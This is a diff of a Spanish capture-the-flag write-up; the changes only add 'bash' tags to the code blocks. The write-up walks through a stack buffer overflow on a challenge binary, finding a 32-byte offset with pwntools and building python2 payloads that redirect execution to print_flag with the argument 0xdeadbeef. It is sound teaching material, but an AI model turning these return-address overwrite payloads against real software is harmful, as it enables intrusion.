@@ -25,7 +25,7 @@ Lo que queremos conseguir es modificar la dirección de retorno para, en el mome
 Ya sabemos que atacar, veamos cómo hacerlo.
 Primero vamos a obtener la cantidad de caracteres que se necesitan introducir para poder modificar la dirección de retorno. Para esto utilizaremos el plugin de GDB llamado GEF (https://github.com/hugsy/gef) aunque existen otras herramientas que hacen lo mismo. Para generar el padding usaremos la libreria de python pwntools:
 
-```
+```bash
 $ pwn cyclic 200
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 ```
@@ -37,14 +37,14 @@ Ahora ejecutaremos con gef el binario e introduciremos esa cadena al momento de 
 
 Como vemos, nos indica que la dirección a la que ha intentado acceder es 0x61616169, que se corresponde con los valores ascii iaaa. Para obtener el padding usamos el siguiente comando:
 
-```
+```bash
 $ pwn cyclic -l iaaa
 32
 ```
 
 Además, al no tener PIE, como vimos en el análisis estático, podemos conocer con facilidad la dirección de la función. Podemos hacerlo con muchas herraminetas (ghidra, radare2, ida...) pero usaremos GDB. Para ello abrimos el binario e introducimos la linea 'info functions', donde veremos la siguiente línea entre todas las demás '0x08049443  print_flag'. Con esto ya podemos hacer la primera versión del payload que nos permita acceder a la función. Usaremos python2 por su sencillez, aqui va la línea:
 
-```
+```bash
 $ python2 -c 'print "3\n"+"a"*32+"\x43\x94\x04\x08"' > payload
 ```
 
@@ -54,7 +54,7 @@ Primero enviamos el 3 para seleccionar la opción donde está la vulnerabilidad,
 
 Como vemos, hemos llegado a la función, pero nos falta meter el argumento para que podamos imprimir la flag. Para añadirlo debemos incluir lo que sería la siguiente dirección de retorno, que en este caso nos da igual, y posteriormente lo que queremos enviar en little endian, que como vimos en la caputura de ghidra de la función, se trata de 0xdeadbeef en int, por lo que tendremos que tratarlo igual que en la función:
 
-```
+```bash
 $ python2 -c 'print "3\n"+"a"*32+"\x43\x94\x04\x08"+"AAAA"+"\xef\xbe\xad\xde"' > payload
 ```
 
@@ -72,5 +72,3 @@ PWNED!
 SUGUS{4br4_c4d4br4_p4t4_d3_c4br4}
 
 Muchas gracias por leer el writeup, cualquier duda puedes contactarme al telegram: @Rojorge
-
-
